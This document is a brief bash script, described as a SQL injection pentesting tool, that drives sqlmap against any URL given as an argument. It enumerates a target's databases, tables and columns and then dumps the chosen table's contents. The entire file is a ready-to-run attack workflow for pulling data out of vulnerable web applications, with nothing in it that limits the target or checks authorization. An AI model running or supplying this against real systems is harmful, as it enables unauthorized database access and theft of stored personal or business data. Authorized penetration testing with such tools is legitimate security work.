#!/bin/bash

# A simple SQL injection pentesting script using SQLMap

# Check if the user has provided a URL as an argument
if [ -z "$1" ]; then
    # If no URL is provided, display usage information
    echo "Usage: ./sql_injection_test.sh <target_url>"
    exit 1
fi

# Target URL (use the first argument passed to the script)
TARGET_URL=$1

# Display a message indicating the start of the testing process
echo "Starting SQL injection test on $TARGET_URL..."

# Run SQLMap to perform database discovery (list databases)
sqlmap -u "$TARGET_URL" --dbs --batch

# Ask the user to select a database for exploration
echo "Enter the database name you want to explore:"
read DB_NAME

# Run SQLMap to list tables in the selected database
sqlmap -u "$TARGET_URL" -D "$DB_NAME" --tables --batch

# Ask the user to select a table for exploration
echo "Enter the table name you want to explore:"
read TABLE_NAME

# Run SQLMap to list columns in the selected table
sqlmap -u "$TARGET_URL" -D "$DB_NAME" -T "$TABLE_NAME" --columns --batch

# Ask the user to dump data from the selected table
echo "Dumping data from table $TABLE_NAME..."
sqlmap -u "$TARGET_URL" -D "$DB_NAME" -T "$TABLE_NAME" --dump --batch

# End message
echo "SQL injection testing completed."
